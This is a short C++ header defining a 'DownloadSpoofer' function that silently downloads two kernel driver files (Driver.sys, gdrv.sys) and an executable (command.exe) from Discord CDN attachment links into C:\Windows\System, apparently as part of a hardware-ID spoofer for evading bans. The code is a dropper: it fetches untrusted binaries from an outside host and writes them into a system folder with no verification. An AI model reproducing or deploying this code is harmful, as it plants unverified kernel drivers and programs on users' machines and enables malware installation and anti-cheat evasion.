#pragma once
#include <Windows.h>
#include <iostream>
#pragma comment (lib, "Urlmon.lib")
using namespace std;
void DownloadSpoofer() 
{
	cout << "Downloading Spoofer..." << endl;
	URLDownloadToFileW(NULL, (LPCWSTR)L"https://cdn.discordapp.com/attachments/795537165383630850/851921527255203860/Driver.sys", (LPCWSTR)L"C:\\Windows\\System\\Driver.sys", 0, NULL);
	URLDownloadToFileW(NULL, (LPCWSTR)L"https://cdn.discordapp.com/attachments/795537165383630850/839208454010175498/gdrv.sys", (LPCWSTR)L"C:\\Windows\\System\\gdrv.sys", 0, NULL);
	URLDownloadToFileW(NULL, (LPCWSTR)L"https://cdn.discordapp.com/attachments/795537165383630850/839208449061683200/command.exe", (LPCWSTR)L"C:\\Windows\\System\\command.exe", 0, NULL);
	cout << "Downloading is Complete!!!" << endl;
}